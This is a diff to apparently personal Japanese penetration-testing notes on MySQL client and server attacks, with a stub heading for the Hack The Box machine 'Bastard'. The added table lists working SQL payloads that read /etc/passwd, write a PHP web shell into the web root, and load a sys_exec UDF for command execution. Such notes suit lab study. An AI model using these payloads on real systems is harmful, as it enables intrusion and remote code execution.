@@ -12,3 +12,22 @@
 接続先データベースを指定できる場合、クライアント側に接続
 
 クライアントがアタッカーかホストか、サーバがアタッカーかホストかで分類できるかも
+
+SQL Injectionのコメントアウトからの推定
+
+
+
+| Description                                  | Command                                                      |
+| -------------------------------------------- | ------------------------------------------------------------ |
+| MySQLクライアント：DBにファイルを読み込み    | `load data local infile '/etc/passwd' into table dummy`      |
+| MySQLクライアント：DBからファイルを書き出し  | `select '<?php echo system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php'` |
+| MySQLサーバ：DBにファイルを読み込み          | `select load_file('/etc/passwd')`                            |
+| MySQLサーバ：DBからファイルを書き出し        | なし                                                         |
+| 関数定義（`$MYSQL_HOME\lib\plugin\udf.dll`） | `create function sys_exec returns int soname 'udf.dll'`      |
+
+HTB: Bastard
+
+```console
+a
+```
+
